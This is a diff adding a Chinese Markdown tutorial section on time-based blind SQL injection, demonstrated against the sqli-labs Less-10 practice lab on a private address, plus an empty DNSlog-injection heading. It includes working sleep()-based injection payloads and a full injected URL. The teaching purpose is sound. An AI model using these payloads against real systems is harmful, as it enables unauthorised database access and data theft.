@@ -248,3 +248,44 @@ ord(substr(select database()),1,1))=114
 
 - **5.可以修改limit 来查询第二张表，过程与上方相似，不做重复演示**
 	
+## <font color = #1E90FF>时间盲注</font>
+### <font color = #FF0000>原理</font><BR>
+**代码存在SQL注入漏洞<BR>然而页面既不会回显数据，也不会回显错误信息<BR>语句执行后也不提示真假，我们不能通过页面的内容来进行判断<BR>这里可以通过构造语句。通过页面响应的时长，来判断信息，这就是时间盲注**
+
+### <font color = #FF0000>时间盲注方法</font><BR>
+* **核心语法:**
+```mysql
+if ( left( user(),1 )='a',0,sleep(3) );
+```
+<figure class="thumbnails">
+    <img src="picture/SQLzhuru/时间盲注1.png">
+
+</figure>
+
+* **真实场景:**
+```
+if( ascii( substr(database(),1,1) )>115,0,sleep(5) )
+```
+<figure class="thumbnails">
+    <img src="picture/SQLzhuru/时间盲注2.png">
+</figure>
+
+### <font color = #FF0000>时间盲注实验:</font><BR>
+**环境：sqli靶场第10关**
+
+ - **1.在url后方添加?id=1,界面正常**
+	- **在后方添加逻辑判断，发现页面无反应**
+	- **在后方加入 下方语句，然后F12发现响应时间变成了4s,说明左侧第一位不是a**
+	```
+	http://192.168.2.149:86/Less-10/?id=1" and  if(left(user(),1)='a',0,sleep(3)) --+
+	```
+	<figure class="thumbnails">
+    <img src="picture/SQLzhuru/时间盲注3.png">
+	</figure>
+ - **2.可以通过这种方式一位一位的来进行判断**
+
+ ## <font color = #1E90FF>Dnslog盲注</font>
+ ### <font color = #FF0000>原理</font><BR>
+<figure class="thumbnails">
+	<img src="picture/SQLzhuru/dnslog注入1.png">
+</figure>
